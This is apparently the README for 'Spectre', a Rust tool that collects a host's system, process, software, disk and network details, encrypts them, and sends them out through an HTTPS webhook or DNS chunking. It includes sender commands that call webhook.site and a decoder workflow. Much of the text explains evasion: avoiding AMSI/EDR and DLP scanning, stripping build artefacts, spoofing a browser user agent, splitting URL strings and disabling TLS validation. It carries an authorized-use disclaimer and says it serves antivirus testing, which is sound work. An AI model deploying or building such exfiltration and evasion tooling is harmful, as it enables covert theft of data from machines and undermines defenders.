# Spectre

> ⚠️ **Disclaimer**: This project is intended strictly for **authorized** security assessments, malware analysis, antivirus detection validation, and defensive research. Do not use it for any illegal or unauthorized purposes. Users are solely responsible for all legal and compliance obligations.

A lightweight, Rust-based tool for **information harvesting and encrypted exfiltration** from a target environment (sandbox / VM / host). It collects system fingerprints on the target machine, applies **zlib compression + ChaCha20-Poly1305 authenticated encryption**, then exfiltrates via a covert channel (HTTPS callback or DNSLOG chunking). The receiving-end script reconstructs readable JSON.

---

## ✨ Features

- **Comprehensive collection**: hostname / CPU / OS version / user / working directory / desktop / memory / full process list / installed software / C-drive & all disks / NIC (WLAN) info.
- **No PowerShell dependency**: NIC, processes, disks, and memory are all obtained via low-level `sysinfo` (WinAPI `GetAdaptersAddresses`, etc.), avoiding AMSI / EDR behavioral detection of `powershell.exe` child processes.
- **End-to-end encryption**: data is zlib-compressed then ChaCha20-Poly1305 encrypted; plaintext is never exposed, evading DLP plaintext scanning.
- **Dual exfiltration channels**: default one-shot full HTTPS POST callback; fallback DNSLOG chunking (`<label>.<your-domain>`).
- **Evasion-friendly build**: release strips symbols, `/DEBUG:NONE` fully disables PDB generation, size-optimized, no UPX packing.

---

## 📦 Project Structure

```
.
├── Cargo.toml            # Dependencies + release build optimizations (size/symbol stripping)
├── .cargo/config.toml    # Cargo linker args: /DEBUG:NONE to fully disable PDB
├── src/
│   ├── main.rs           # Entry: argument parsing + orchestration + dry-run debug
│   ├── collect.rs        # Collection: host/CPU/system/user/dir/memory/process/software/disk/NIC
│   ├── crypto.rs         # ChaCha20-Poly1305 authenticated encryption + random Nonce + Base32
│   └── exfil.rs          # Exfiltration: HTTPS POST callback (fallback DNS chunking)
├── scripts/
│   └── decode.py         # Receiver: ciphertext/logs → decrypt → JSON plaintext
├── examples/
│   └── report.html       # Sample intelligence report (sanitized)
├── CODE_AUDIT.md         # Code audit report (items pending fix before release)
```

---

## 🚀 Build

Requires the Rust toolchain (recommend `x86_64-pc-windows-msvc` on Windows):

```bash
cargo build --release
```

Output: `target/release/spectre.exe` (PDB generation is disabled by default via `.cargo/config.toml`).

---

## 🔧 Usage

### Sender (run on the target environment)

```bash
# 1) Local debug: print collection result only, no exfiltration
spectre --dry-run

# 2) Real exfiltration: call back to the compiled-in webhook by default
spectre

# 3) Override callback URL (overrides the built-in default)
spectre --url https://webhook.site/xxxx-xxxx-xxxx

# 4) Specify key (64 hex chars, must match the decoder)
spectre --key <64-hex>

# 5) Fallback DNS chunking exfil (active when --url omitted; change exfil.rs BASE_DOMAIN)
spectre --id probe-1
```

### Receiver (local reconstruction)

```bash
# Option 1: paste the ciphertext directly from the webhook "request body"
python scripts/decode.py --raw "base64(nonce):base64(ct)" --needles "hostname,processes"

# Option 2: reconstruct from exported DNSLOG logs
python scripts/decode.py --file dump.txt --reverse --needles "hostname,processes"

# When key differs from sender
python scripts/decode.py --raw "..." --key <64-hex>
```

> `decode.py` uses a built-in demo key by default; if the sender specifies `--key`, pass the same key when decoding.

---

## 🔒 Security Design

| Dimension | Approach |
|-----------|----------|
| Collection evasion | Fully via `sysinfo` (WinAPI), zero PowerShell/ipconfig child processes |
| Transport encryption | zlib compression → ChaCha20-Poly1305 authenticated encryption (random Nonce), plaintext never exposed |
| Authentication | AAD `spectre-v1`, prevents replay/reassembly |
| Channel disguise | UA masquerades as Chrome 124, URL split-concatenated to weaken string fingerprint |
| Build evasion | `strip=symbols` + `/DEBUG:NONE`(no PDB) + `opt-level=z`/`lto=thin`/`panic=abort`, no UPX |
| Sandbox adaptation | Disables TLS certificate validation to bypass sandbox TLS interception (`UnknownIssuer`) |

---

## 📚 Exfiltration Flow

```
Run spectre.exe on target
   ├─ ① collect()             → JSON
   ├─ ② compress() (zlib)     → reduce size
   ├─ ③ crypto::encrypt()     → ChaCha20-Poly1305, random Nonce
   └─ ④ exfil::exfil_http()   → HTTPS POST full callback
                                     └（fallback: DNS chunking）

Collect ciphertext from webhook / DNSLOG console
   └─ scripts/decode.py       → decrypt → full JSON plaintext
```

---

## 📄 License

[MIT](./LICENSE)

---

## ⚠️ Notes

1. **Do not add a fake/self-signed signature** to the artifact — it directly triggers AV behavioral detection (e.g. `DefenseEvasion`), backfiring. Only legitimate code-signing certificates reduce detection, and those must be obtained through official channels.
2. **Disabling TLS certificate validation cuts both ways** — it bypasses sandbox TLS interception but may also be flagged as an evasion tactic. To further lower detection, consider switching to DNSLOG chunking exfiltration.
3. The **callback URL** is hardcoded in `src/main.rs` by default; replace it with your own collector before deployment.
4. If the **sandbox has no network**, neither HTTP nor DNS exfiltration works — only static detection rates can be tested.

---

## 🧰 Dependencies

| crate | Purpose |
|-------|---------|
| `sysinfo` | System/process/disk/memory/NIC (WinAPI) collection |
| `chacha20poly1305` | Authenticated encryption |
| `flate2` | zlib compression |
| `ureq` + `rustls` | HTTPS POST exfil / TLS |
| `data-encoding` | Base32 encoding (DNS labels) |
| `rand` | Random numbers (Nonce) |
| `dns-lookup` | Fallback DNS chunking exfil |
